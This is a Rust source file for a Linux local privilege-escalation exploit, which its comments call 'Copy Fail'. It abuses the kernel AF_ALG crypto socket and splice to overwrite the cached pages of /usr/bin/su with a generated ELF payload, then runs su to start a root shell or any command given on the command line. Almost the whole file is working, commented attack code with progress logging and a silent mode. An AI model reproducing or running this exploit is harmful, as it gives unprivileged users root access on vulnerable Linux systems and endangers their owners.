mod elf;
mod logger;

use std::env;
use std::fs::File;
use std::io;
use std::os::unix::io::{AsRawFd, FromRawFd, OwnedFd};

use logger::Logger;

// --- Linux Kernel Constants ---
// These are defined in the Linux kernel headers (e.g., linux/if_alg.h).
// AF_ALG: Address Family for the kernel Crypto API.
const AF_ALG: i32 = 38;
// SOCK_SEQPACKET: Socket type for fixed-length datagrams.
const SOCK_SEQPACKET: i32 = 5;
// SOL_ALG: Socket level for algorithm-specific options.
const SOL_ALG: i32 = 279;
// Algorithm control set commands.
const ALG_SET_KEY: i32 = 1;
const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
const ALG_SET_OP: i32 = 3;
const ALG_SET_IV: i32 = 2;
const ALG_SET_AEAD_ASSOCLEN: i32 = 4;

/// sockaddr_alg structure for binding to the AF_ALG address family.
/// The layout must strictly match the Linux kernel definition.
#[repr(C)]
struct sockaddr_alg {
    salg_family: libc::sa_family_t, // Protocol family
    salg_type: [libc::c_uchar; 14], // Algorithm type (e.g., "aead")
    salg_feat: u32,                // Feature bits
    salg_mask: u32,                // Mask bits
    salg_name: [libc::c_uchar; 64], // Algorithm name
}

/// Performs a single cryptographic operation cycle using the AF_ALG interface.
/// This is where the core of the Copy Fail vulnerability is triggered.
fn crypto_op(file: &File, offset: usize, chunk: &[u8], log: &Logger) -> io::Result<()> {
    log.debug(&format!("Processing chunk at offset {}", offset));

    // 1. Create an AF_ALG socket to interact with the kernel's crypto engine.
    log.debug("Creating AF_ALG socket...");
    let sock_fd = unsafe { libc::socket(AF_ALG, SOCK_SEQPACKET, 0) };
    if sock_fd < 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to create AF_ALG socket: {}", err));
        return Err(err);
    }
    // OwnedFd ensures the file descriptor is closed when it goes out of scope.
    let sock = unsafe { OwnedFd::from_raw_fd(sock_fd) };

    // 2. Bind the socket to the target algorithm (authencesn: HMAC-SHA256 + AES-CBC).
    log.debug("Binding socket to authencesn algorithm...");
    let mut addr: sockaddr_alg = unsafe { std::mem::zeroed() };
    addr.salg_family = AF_ALG as libc::sa_family_t;
    let alg_type = b"aead";
    let alg_name = b"authencesn(hmac(sha256),cbc(aes))";
    addr.salg_type[..alg_type.len()].copy_from_slice(alg_type);
    addr.salg_name[..alg_name.len()].copy_from_slice(alg_name);

    let ret = unsafe {
        libc::bind(
            sock.as_raw_fd(),
            &addr as *const _ as *const libc::sockaddr,
            std::mem::size_of::<sockaddr_alg>() as libc::socklen_t,
        )
    };
    if ret != 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to bind AF_ALG socket: {}", err));
        return Err(err);
    }

    // 3. Set the cryptographic key and auth size.
    // The specific key used here follows the pattern in the original PoC.
    log.debug("Configuring cryptographic parameters...");
    let mut key = [0u8; 40];
    key[0..8].copy_from_slice(&[0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10]);
    
    unsafe {
        // Set the key for the AEAD algorithm.
        if libc::setsockopt(sock.as_raw_fd(), SOL_ALG, ALG_SET_KEY, key.as_ptr() as *const libc::c_void, key.len() as libc::socklen_t) != 0 {
            log.error("Failed to set ALG_SET_KEY");
        }
        // Set AEAD authentication size. Passing NULL with length 4 is part of the exploit chain.
        if libc::setsockopt(sock.as_raw_fd(), SOL_ALG, ALG_SET_AEAD_AUTHSIZE, std::ptr::null(), 4) != 0 {
            log.error("Failed to set ALG_SET_AEAD_AUTHSIZE");
        }
    }

    // 4. Accept a connection to get a client socket for data transfer.
    log.debug("Waiting for kernel connection acceptance...");
    let accept_fd = unsafe { libc::accept(sock.as_raw_fd(), std::ptr::null_mut(), std::ptr::null_mut()) };
    if accept_fd < 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to accept on AF_ALG socket: {}", err));
        return Err(err);
    }
    let client = unsafe { OwnedFd::from_raw_fd(accept_fd) };

    // 5. Prepare and send control messages (ancillary data).
    // These messages set up the operation (encrypt), the IV, and the associated data length.
    log.debug("Dispatching control messages...");
    let assoc_data = [b'A'; 4].iter().chain(chunk.iter()).copied().collect::<Vec<_>>();
    let op_data = [0u8; 4]; // Encryption operation (usually 0)
    let iv_data = { let mut iv = [0u8; 20]; iv[0] = 0x10; iv };
    let assoclen_data = { let mut alen = [0u8; 4]; alen[0] = 0x08; alen };

    // Calculate space for control messages using CMSG macros.
    let (cmsg1_len, cmsg2_len, cmsg3_len) = unsafe {
        (libc::CMSG_SPACE(4) as usize, libc::CMSG_SPACE(20) as usize, libc::CMSG_SPACE(4) as usize)
    };
    let total_cmsg_len = cmsg1_len + cmsg2_len + cmsg3_len;
    let mut cmsg_buf = vec![0u8; total_cmsg_len];
    let mut cmsg_offset = 0;

    // Helper macro to append control messages to the buffer.
    macro_rules! add_cmsg {
        ($level:expr, $type:expr, $data:expr) => {{
            let len = $data.len();
            unsafe {
                let cmsg_len = libc::CMSG_LEN(len as u32) as usize;
                let ptr = cmsg_buf.as_mut_ptr().add(cmsg_offset) as *mut libc::cmsghdr;
                (*ptr).cmsg_len = cmsg_len as _;
                (*ptr).cmsg_level = $level;
                (*ptr).cmsg_type = $type;
                let data_ptr = libc::CMSG_DATA(ptr);
                std::ptr::copy_nonoverlapping($data.as_ptr(), data_ptr, len);
                cmsg_offset += libc::CMSG_SPACE(len as u32) as usize;
            }
        }};
    }

    add_cmsg!(SOL_ALG, ALG_SET_OP, &op_data);
    add_cmsg!(SOL_ALG, ALG_SET_IV, &iv_data);
    add_cmsg!(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoclen_data);

    // Send the associated data and control messages. 
    // MSG_MORE (0x8000) is crucial as it flags the kernel to wait for more data via splice.
    let iovec = libc::iovec { iov_base: assoc_data.as_ptr() as *mut libc::c_void, iov_len: assoc_data.len() };
    let mut msghdr: libc::msghdr = unsafe { std::mem::zeroed() };
    msghdr.msg_iov = &iovec as *const _ as *mut libc::iovec;
    msghdr.msg_iovlen = 1;
    msghdr.msg_control = cmsg_buf.as_mut_ptr() as *mut libc::c_void;
    msghdr.msg_controllen = total_cmsg_len as _;

    if unsafe { libc::sendmsg(client.as_raw_fd(), &msghdr, 0x8000) } < 0 {
        log.error("Failed to sendmsg on client socket");
    }

    // 6. Splice the data into the page cache.
    // We create a temporary pipe to move data from the target binary's FD into the crypto socket.
    log.debug("Performing zero-copy splice into page cache...");
    let mut pipe_fds = [0i32; 2];
    if unsafe { libc::pipe(pipe_fds.as_mut_ptr()) } != 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to create pipe: {}", err));
        return Err(err);
    }
    let (read_pipe, write_pipe) = (pipe_fds[0], pipe_fds[1]);

    let len = offset + 4;
    let mut src_offset: libc::off_t = 0;
    unsafe {
        // Move data from the file to the pipe.
        if libc::splice(file.as_raw_fd(), &mut src_offset, write_pipe, std::ptr::null_mut(), len, 0) < 0 {
            log.error("Splice from file to pipe failed");
        }
        // Move data from the pipe to the crypto socket. This is where the page cache corruption happens.
        if libc::splice(read_pipe, std::ptr::null_mut(), client.as_raw_fd(), std::ptr::null_mut(), len, 0) < 0 {
            log.error("Splice from pipe to socket failed");
        }
        
        // Receive the response to complete the operation.
        let recv_len = 8 + offset;
        let mut recv_buf = vec![0u8; recv_len];
        if libc::recv(client.as_raw_fd(), recv_buf.as_mut_ptr() as *mut libc::c_void, recv_len, 0) < 0 {
            log.error("Recv from client socket failed");
        }
        
        // Cleanup the temporary pipe.
        libc::close(read_pipe);
        libc::close(write_pipe);
    }
    
    log.debug("Cycle completed successfully.");
    Ok(())
}

fn main() -> io::Result<()> {
    // 1. Parse command line arguments.
    let all_args: Vec<String> = env::args().collect();
    let mut silent = false;
    let mut target_command = "/bin/sh";
    let mut positional_args = Vec::new();

    for arg in all_args.iter().skip(1) {
        match arg.as_str() {
            "-s" | "--silent" => silent = true,
            _ => positional_args.push(arg),
        }
    }

    if !positional_args.is_empty() {
        target_command = positional_args[0];
    }

    let log = Logger::new(silent);

    // 2. Build the malicious ELF payload dynamically based on the requested command.
    let payload = elf::build_elf_payload(target_command);
    log.info(&format!("Exploit payload constructed for command: {}", target_command));

    // 3. Open the target binary (e.g., /usr/bin/su). 
    // We only need read access to trigger the page cache vulnerability.
    let su_file = match File::open("/usr/bin/su") {
        Ok(f) => {
            log.info("Target binary (/usr/bin/su) opened.");
            f
        },
        Err(e) => {
            log.error(&format!("Could not open /usr/bin/su: {}.", e));
            return Err(e);
        }
    };

    // 4. Start the iterative injection process. 
    // We inject the payload chunk by chunk (4 bytes each) into the target file's page cache.
    let mut i = 0;
    let total_chunks = (payload.len() + 3) / 4;
    while i < payload.len() {
        let current_chunk = (i / 4) + 1;
        let chunk_end = std::cmp::min(i + 4, payload.len());
        let chunk = &payload[i..chunk_end];
        
        // Perform the injection cycle.
        if let Err(e) = crypto_op(&su_file, i, chunk, &log) {
            log.error(&format!("Exploit failed at offset {}: {}", i, e));
            return Err(e);
        }

        // Log progress every 10 chunks or at the very end.
        if current_chunk % 10 == 0 || i + 4 >= payload.len() {
            log.info(&format!("Page cache injection progress: {}/{} chunks.", current_chunk, total_chunks));
        }
        i += 4;
    }

    log.info("All payload chunks successfully injected into page cache.");
    
    // 5. Trigger the exploit. 
    // Since the page cache for /usr/bin/su is now corrupted with our shellcode,
    // executing it will run our payload with root privileges.
    log.info("Triggering exploit via 'su' execution...");
    unsafe {
        let ret = libc::system(b"su\0".as_ptr() as *const libc::c_char);
        if ret == -1 {
            log.error("Failed to execute 'su' binary.");
        } else {
            log.info(&format!("Exploit execution finished (exit code {}).", ret));
        }
    }

    Ok(())
}
